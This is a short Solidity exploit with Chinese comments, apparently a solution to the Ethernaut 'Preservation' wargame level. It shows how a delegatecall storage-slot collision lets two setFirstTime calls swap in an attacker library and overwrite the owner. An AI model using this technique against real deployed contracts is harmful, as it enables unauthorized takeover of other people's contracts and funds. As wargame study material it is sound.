//我们需要了解代理合约和逻辑合约的slot是要一一对应的
//我们可以在第一次调用setFirstTime(uint256 _timeStamp)是输入 我们的attack合约地址 ，可通过getAddress()获取attack合约地址的uint256类型作为参数
//这时被攻击合约的timeZone1Library的地址被存入我们attack合约的地址，因为LibraryContract的storedTime 对应着 Preservation合约的timeZone1Library
//第二次再调用setFirstTime(uint256 _timeStamp)函数，这次输入我们要设置的uint256（owner地址），完成攻击，因为Attack合约的setTime(uint _time)设置的storedTime对应着 Preservation合约的owner


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

    function caculateAddress()public view returns(uint){
        return uint256(uint160(address(this)));
    }

    function caculateOwner(address owner_)public pure returns(uint){
        return uint256(uint160(owner_));
    }
}
